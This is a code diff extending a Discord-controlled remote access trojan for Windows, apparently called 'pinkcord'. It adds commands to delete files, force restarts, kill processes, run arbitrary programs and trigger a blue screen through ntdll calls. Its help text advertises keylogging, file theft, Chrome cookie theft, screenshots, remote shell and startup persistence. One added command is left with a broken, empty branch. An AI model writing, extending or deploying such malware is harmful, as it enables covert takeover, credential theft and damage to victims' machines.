@@ -17,6 +17,7 @@ from zipfile import ZipFile
 import random
 import shutil
 import pyperclip
+import ctypes
 
 while True:
     try:
@@ -249,6 +250,22 @@ while True:
                         x = x + 1
 
         @bot.command()
+        async def delete(ctx, session, path):
+            if session == "all":
+                try:
+                    os.remove(path)
+                    await ctx.send(f"File '{path}' has been deleted.")
+                except Exception as e:
+                    await ctx.send(f"An error occurred: {e}")
+            else:
+                if session == sesja:
+                    try:
+                        os.remove(path)
+                        await ctx.send(f"File '{path}' has been deleted.")
+                    except Exception as e:
+                        await ctx.send(f"An error occurred: {e}")
+
+        @bot.command()
         async def message(ctx, sesion, *args):
             title = args[0]
             button = args[1]
@@ -384,32 +401,95 @@ while True:
             else:
                 if session == sesja:
                     os.system("shutdown /s /f /t 1")
+
+        @bot.command()
+        async def restart(ctx, session):
+            if session == "all":
+                os.system("powershell.exe Restart-Computer -Force")
+                await ctx.send(f"The remote system {sesja} is being restarted.")
+            else:
+                if session == sesja:
+                    os.system("powershell.exe Restart-Computer -Force")
+                    await ctx.send(f"The remote system {sesja} is being restarted.")
+        
+        @bot.command()
+        async def wallpaper(ctx, session, *args):
+            if session == "all":
+                filePATH = " ".join(args)
+                filePATH = os.path.abspath(filePATH)
+                ctypes.windll.user32.SystemParametersInfoW(20, 0, filePATH , 0)
+                await ctx.send(f"wallpaper changed successfully")
+            else:
+                if session == sesja:
+                    filePATH = " ".join(args)
+                    filePATH = os.path.abspath(filePATH)
+                    ctypes.windll.user32.SystemParametersInfoW(20, 0, filePATH , 0)
+                    await ctx.send(f"wallpaper changed successfully")
+        
+        @bot.command()
+        async def kill(ctx, session, *args):
+            if session == "all":
+                task = " ".join(args)
+                os.system(f"taskkill /f /im {task}")
+                await ctx.send(f"task {task} killed successfull")
+            else:
+                if session == sesja:
+                    task = " ".join(args)
+                    os.system(f"taskkill /f /im {task}")
+                    await ctx.send(f"task {task} killed successfull")
+        
+        @bot.command()
+        async def bsod(ctx, session):
+            if session == "all":
+                ERROR_CODE = 0xDEADDEAD
+                ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
+                ctypes.windll.ntdll.NtRaiseHardError(ERROR_CODE, 0, 0, None, 6, ctypes.byref(ctypes.c_uint()))
+            else:
+                if session == sesja:
+                    ERROR_CODE = 0xDEADDEAD
+                    ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
+                    ctypes.windll.ntdll.NtRaiseHardError(ERROR_CODE, 0, 0, None, 6, ctypes.byref(ctypes.c_uint()))
+
+        @bot.command()
+        async def execute(ctx, session, program):
+            if session == "all":
+                os.system(program)
+                await ctx.send(f"Program '{program}' executed on all sessions.")
+            else:
+                if session == sesja:
+                await ctx.send(f"Program '{program}' executed on session {sesja}.")
         
         @bot.command()
         async def h(ctx):
             wiadomosc = '''
-!shell [session] [output(yes, no)] [command] - Executes a shell command on a remote computer.
-!ss [session] - Captures a screenshot from a remote computer.
-!keylogger [session] [action(start, stop, log)] - Starts or stops a keylogger on a remote computer.
-!steal [session] [file_names] - Steals files from a remote computer.
-!info [session] - Retrieves information about the remote computer system.
+!bsod [session] - Display BSOD (Blue Screen of Death).
 !cd [session] [path] - Changes the current directory on the remote computer.
-!up [session] - Increases the volume on the remote computer.
-!down [session] - Decreases the volume on the remote computer.
-!message [session] [title] [button] [message] - Displays a message on the remote computer.
-!dir [session] - Displays the current directory on the remote computer.
-!upload [session] [link] [file_name] - Sends a file to the remote computer.
-!click [session] [x] [y] - Clicks at a specific location on the screen.
-!press [session] [key] - Presses a specific key (default: Enter).
-!cli [session] - Copies the clipboard content.
-!write [session] [message] - Types using the keyboard.
-!loc [session] - Displays IP information.
 !cdrom [session] - Opens the CD-ROM drive.
-!sessions - Displays all sessions.
+!chrome [session] [action(cookie)] - Steals selected data from Chrome.
+!cli [session] - Copies the clipboard content.
+!click [session] [x] [y] - Clicks at a specific location on the screen.
+!delete [session] [path] - Deletes a file from the remote computer.
+!dir [session] - Displays the current directory on the remote computer.
+!down [session] - Decreases the volume on the remote computer.
+!execute [session] [program] - Executes a specific program on the remote computer.
+!info [session] - Retrieves information about the remote computer system.
+!keylogger [session] [action(start, stop, log)] - Starts or stops a keylogger on a remote computer.
+!kill [session] [task] - Remote task killing.
+!loc [session] - Displays IP information.
+!message [session] [title] [button] [message] - Displays a message on the remote computer.
+!press [session] [key] - Presses a specific key (default: Enter).
 !rename [session] [new_name] - Changes the name of a session.
-!startup [session] [file path] - copy file to startup folder (you can copy pinkcord exe file)
-!shutdown [session] - Shutdown the remote computer.
-!chrome [session] [action(cookie)] - steals selected data from chrome
+!restart [session] - Restarts the remote computer.
+!shell [session] [output(yes, no)] [command] - Executes a shell command on a remote computer.
+!sessions - Displays all sessions.
+!shutdown [session] - Shuts down the remote computer.
+!ss [session] - Captures a screenshot from a remote computer.
+!startup [session] [file path] - Copies a file to the startup folder (you can copy pinkcord exe file).
+!steal [session] [file_names] - Steals files from a remote computer.
+!up [session] - Increases the volume on the remote computer.
+!upload [session] [link] [file_name] - Sends a file to the remote computer.
+!wallpaper [session] [path] - Changes the wallpaper on the remote computer.
+!write [session] [message] - Types using the keyboard.
             '''
             await ctx.send(wiadomosc)
 
